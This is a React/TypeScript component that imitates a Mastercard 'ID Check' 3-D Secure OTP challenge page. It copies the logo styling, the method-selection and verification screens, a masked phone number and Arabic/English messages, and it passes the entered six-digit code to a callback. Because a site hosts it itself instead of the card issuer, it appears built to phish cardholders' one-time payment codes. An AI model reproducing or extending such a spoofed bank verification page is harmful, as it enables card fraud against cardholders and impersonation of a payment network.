import React, { useMemo, useState } from 'react';

type Phase = 'method' | 'verify' | 'processing' | 'success' | 'failed';

export type AcsOtpChallengeProps = {
  orderRef?: string | null;
  phoneLast3?: string | null;
  lang?: string;
  /** attempt / resend meta shown on verify */
  otpAttempts?: number;
  otpMaxAttempts?: number;
  otpRemaining?: number;
  otpRetryNotice?: boolean;
  otpResendNotice?: boolean;
  resendCooldown?: number;
  resendLoading?: boolean;
  /** external phase override (failed / checking) */
  externalState?: 'input' | 'checking' | 'failed' | 'idle';
  failReason?: string | null;
  onMethodNext?: () => void | Promise<void>;
  onSubmitOtp: (code: string) => void | Promise<void>;
  onResend?: () => void | Promise<void>;
  onRetry?: () => void;
  /** i18n helper optional */
  t?: (key: string, fallback?: string) => string;
};

function maskPhone(last3?: string | null) {
  const d = String(last3 || '').replace(/\D/g, '').slice(-3);
  return d ? `********${d}` : '********---';
}

/**
 * Mastercard ACS-style 3DS OTP UI.
 * - Choose Method → Next (does NOT send OTP)
 * - Verify → code only sent when Next is pressed
 */
export function AcsOtpChallenge({
  phoneLast3,
  lang = 'ar',
  otpAttempts = 0,
  otpMaxAttempts = 2,
  otpRemaining = 2,
  otpRetryNotice = false,
  otpResendNotice = false,
  resendCooldown = 0,
  resendLoading = false,
  externalState = 'input',
  failReason,
  onMethodNext,
  onSubmitOtp,
  onResend,
  onRetry,
  t,
}: AcsOtpChallengeProps) {
  const isAr = lang === 'ar';
  const tr = (key: string, fallback: string) => (t ? t(key, fallback) : fallback);

  const [phase, setPhase] = useState<Phase>('method');
  const [otp, setOtp] = useState('');
  const [error, setError] = useState('');
  const [attempt, setAttempt] = useState(1);
  const [busy, setBusy] = useState(false);

  const phoneMask = useMemo(() => maskPhone(phoneLast3), [phoneLast3]);

  // Sync external failed / checking
  const effectivePhase: Phase =
    externalState === 'failed'
      ? 'failed'
      : externalState === 'checking'
        ? 'processing'
        : phase;

  const handleMethodNext = async () => {
    if (busy) return;
    setBusy(true);
    setError('');
    try {
      await onMethodNext?.();
      setOtp('');
      setAttempt(1);
      setPhase('verify');
    } catch {
      setError(isAr ? 'تعذر المتابعة. حاول مرة أخرى.' : 'Could not continue. Try again.');
    } finally {
      setBusy(false);
    }
  };

  const handleOtpNext = async () => {
    if (busy) return;
    const code = otp.replace(/\D/g, '');
    if (code.length < 4) {
      setError(
        isAr
          ? 'أدخل الرمز ثم اضغط Next'
          : 'Enter the code, then press Next',
      );
      return;
    }
    setError('');
    setBusy(true);
    setPhase('processing');
    try {
      await onSubmitOtp(code);
    } catch {
      setPhase('verify');
      setError(
        isAr ? 'الرمز غير صحيح. حاول مرة أخرى.' : 'Incorrect code. Please try again.',
      );
      setBusy(false);
    }
  };

  const handleResend = async () => {
    if (!onResend || resendLoading || resendCooldown > 0) return;
    setAttempt((a) => a + 1);
    setOtp('');
    setError('');
    await onResend();
  };

  return (
    <div className="acs-otp-root" dir="ltr">
      <style>{ACS_CSS}</style>

      {effectivePhase === 'failed' && (
        <div className="acs-screen active">
          <div className="acs-logo-row">
            <div className="acs-bank">ID Check</div>
            <div className="acs-mc" aria-hidden="true">
              <span className="acs-mc-r" />
              <span className="acs-mc-y" />
            </div>
          </div>
          <h1 className="acs-h1">{isAr ? 'عملية مرفوضة' : 'Authentication failed'}</h1>
          <p className="acs-p">
            {failReason === 'otp_attempts_exceeded'
              ? tr('otpRejectedAttempts', isAr ? 'تم تجاوز عدد محاولات الرمز.' : 'OTP attempts exceeded.')
              : isAr
                ? 'تم رفض العملية أو البطاقة غير صالحة.'
                : 'Payment was declined or the card was not accepted.'}
          </p>
          {onRetry && (
            <button type="button" className="acs-btn acs-btn-primary" onClick={onRetry}>
              {isAr ? 'حاول مرة أخرى' : 'Try again'}
            </button>
          )}
        </div>
      )}

      {effectivePhase === 'processing' && (
        <div className="acs-screen active">
          <div className="acs-logo-row">
            <div className="acs-bank">ID Check</div>
            <div className="acs-mc" aria-hidden="true">
              <span className="acs-mc-r" />
              <span className="acs-mc-y" />
            </div>
          </div>
          <h1 className="acs-h1">Please wait while we redirect you...</h1>
          <p className="acs-p">Do not refresh or close this page.</p>
          <div className="acs-spinner" aria-hidden="true" />
        </div>
      )}

      {effectivePhase === 'method' && (
        <div className="acs-screen active">
          <div className="acs-cancel-row" />
          <div className="acs-logo-row">
            <div className="acs-bank">ID Check</div>
            <div className="acs-mc" aria-hidden="true">
              <span className="acs-mc-r" />
              <span className="acs-mc-y" />
            </div>
          </div>
          <h1 className="acs-h1">Choose Method</h1>
          <p className="acs-p">Please select the method to be verified</p>
          <label className="acs-radio">
            <input type="radio" name="acs-method" defaultChecked readOnly />
            <span className="acs-radio-label">
              SMS at <strong className="acs-phone">{phoneMask}</strong>
            </span>
          </label>
          {error && <div className="acs-error">{error}</div>}
          <button
            type="button"
            className="acs-btn acs-btn-primary"
            disabled={busy}
            onClick={() => void handleMethodNext()}
          >
            {busy ? '...' : 'Next'}
          </button>
        </div>
      )}

      {effectivePhase === 'verify' && (
        <div className="acs-screen active">
          <div className="acs-cancel-row" />
          <div className="acs-logo-row">
            <div className="acs-bank">ID Check</div>
            <div className="acs-mc" aria-hidden="true">
              <span className="acs-mc-r" />
              <span className="acs-mc-y" />
            </div>
          </div>
          <h1 className="acs-h1">Verify</h1>
          <p className="acs-p">
            We have sent you a message with a code to your registered mobile number ending with{' '}
            <strong className="acs-phone">{phoneMask}</strong>.
          </p>

          <div className="acs-meta">
            <span>
              {tr('otpAttemptLabel', 'Attempt {current}/{max}')
                .replace('{current}', String(Math.min(otpAttempts + 1, otpMaxAttempts)))
                .replace('{max}', String(otpMaxAttempts))}
            </span>
            {otpRemaining < otpMaxAttempts && (
              <span className="acs-meta-remain">
                {tr('otpRemainingAttempts', '{count} left').replace('{count}', String(otpRemaining))}
              </span>
            )}
          </div>

          {(otpRetryNotice || error) && (
            <div className="acs-error" role="alert">
              {error ||
                tr('otpWrongRetry', isAr ? 'الرمز غير صحيح. أعد الإدخال.' : 'Wrong code. Try again.')}
            </div>
          )}
          {otpResendNotice && (
            <div className="acs-notice">
              {tr('otpResendSent', isAr ? 'تم إرسال رمز جديد.' : 'A new code has been sent.')}
            </div>
          )}

          <label className="acs-field-label" htmlFor="acs-otp-input">
            Enter your 6 digit code ({attempt}):
          </label>
          <input
            id="acs-otp-input"
            className="acs-otp-input"
            type="tel"
            inputMode="numeric"
            autoComplete="one-time-code"
            maxLength={6}
            placeholder="------"
            value={otp}
            onChange={(e) => {
              setOtp(e.target.value.replace(/\D/g, '').slice(0, 6));
              setError('');
            }}
            onKeyDown={(e) => {
              if (e.key === 'Enter') {
                e.preventDefault();
              }
            }}
          />

          <button
            type="button"
            className="acs-btn acs-btn-primary"
            disabled={busy || otp.replace(/\D/g, '').length < 4}
            onClick={() => void handleOtpNext()}
          >
            Next
          </button>

          {onResend && (
            <button
              type="button"
              className="acs-btn acs-btn-secondary"
              disabled={resendLoading || resendCooldown > 0 || busy}
              onClick={() => void handleResend()}
            >
              {resendLoading
                ? '...'
                : resendCooldown > 0
                  ? tr('otpResendWait', 'Resend in {sec}s').replace('{sec}', String(resendCooldown))
                  : 'Resend Code'}
            </button>
          )}
        </div>
      )}
    </div>
  );
}

const ACS_CSS = `
.acs-otp-root {
  width: 100%;
  max-width: 400px;
  margin: 0 auto;
  background: #fff;
  color: #514c48;
  font-family: Arial, Helvetica, sans-serif;
  font-size: 15px;
  line-height: 18px;
  border-radius: 8px;
  border: 1px solid #e8e4df;
  padding: 20px;
  box-sizing: border-box;
}
.acs-screen { display: none; flex-direction: column; }
.acs-screen.active { display: flex; }
.acs-cancel-row { min-height: 8px; margin-bottom: 10px; }
.acs-logo-row {
  display: flex; justify-content: space-between; align-items: center;
  margin-bottom: 28px;
}
.acs-bank {
  font-weight: 700; font-size: 15px; color: #1a1a1a;
}
.acs-mc { display: flex; align-items: center; position: relative; width: 42px; height: 24px; }
.acs-mc-r, .acs-mc-y {
  width: 24px; height: 24px; border-radius: 50%; position: absolute;
}
.acs-mc-r { background: #eb001b; left: 0; }
.acs-mc-y { background: #f79e1b; right: 0; opacity: 0.95; }
.acs-h1 {
  color: #00406e; font-size: 20px; font-weight: 700; line-height: 23px;
  margin: 0 0 22px; text-align: center;
}
.acs-p { margin: 0 0 22px; color: #514c48; font-size: 15px; line-height: 20px; }
.acs-phone { color: #00406e; letter-spacing: 0.5px; }
.acs-radio {
  display: block; position: relative; margin-bottom: 22px; cursor: pointer; min-height: 20px;
}
.acs-radio input { position: absolute; opacity: 0; width: 0; height: 0; }
.acs-radio-label {
  display: inline-block; padding-left: 31px; position: relative; width: 100%;
  color: #514c48; font-size: 15px; line-height: 20px;
}
.acs-radio-label::before {
  content: " "; border: 2px solid #797979; border-radius: 50%;
  height: 20px; width: 20px; left: 0; top: 0; position: absolute; box-sizing: border-box;
}
.acs-radio input:checked + .acs-radio-label::before {
  background: #0077b0; border: none;
}
.acs-radio input:checked + .acs-radio-label::after {
  content: " "; border: 2px solid #fff; border-radius: 50%;
  height: 12px; width: 12px; left: 4px; top: 4px; position: absolute; box-sizing: border-box;
}
.acs-field-label { display: block; padding-bottom: 8px; color: #514c48; font-size: 15px; }
.acs-otp-input {
  border: 1px solid #777; border-radius: 4px; height: 36px; letter-spacing: 10px;
  margin-bottom: 18px; padding: 3px 5px; text-align: center; width: 100%;
  font-size: 16px; color: #514c48; font-family: Arial, Helvetica, sans-serif;
  box-sizing: border-box;
}
.acs-otp-input:focus { border-color: #0077b0; outline: none; }
.acs-btn {
  border: none; border-radius: 4px; font-weight: 700; font-size: 15px;
  margin-bottom: 12px; padding: 11px; text-align: center; width: 100%;
  cursor: pointer; line-height: 18px; display: block;
  font-family: Arial, Helvetica, sans-serif;
}
.acs-btn:disabled { opacity: 0.55; cursor: not-allowed; }
.acs-btn-primary {
  background: linear-gradient(180deg, #0077b0, #00527a); color: #fff;
}
.acs-btn-primary:hover:not(:disabled) { background: #00527a; }
.acs-btn-secondary {
  background: linear-gradient(180deg, #fff, #f6f2ec);
  border: 1px solid #d8d1ca; color: #00527a;
}
.acs-error { color: #b00020; margin-bottom: 12px; font-size: 14px; }
.acs-notice { color: #00527a; margin-bottom: 12px; font-size: 14px; }
.acs-meta {
  display: flex; justify-content: space-between; gap: 8px; flex-wrap: wrap;
  margin-bottom: 12px; font-size: 12px; color: #666;
}
.acs-meta-remain {
  background: #fdecea; color: #b00020; border-radius: 999px; padding: 2px 8px; font-weight: 700;
}
.acs-spinner {
  width: 36px; height: 36px; margin: 28px auto;
  border: 3px solid #d8d1ca; border-top-color: #00527a; border-radius: 50%;
  animation: acs-spin 0.8s linear infinite;
}
@keyframes acs-spin { to { transform: rotate(360deg); } }
`;

export default AcsOtpChallenge;
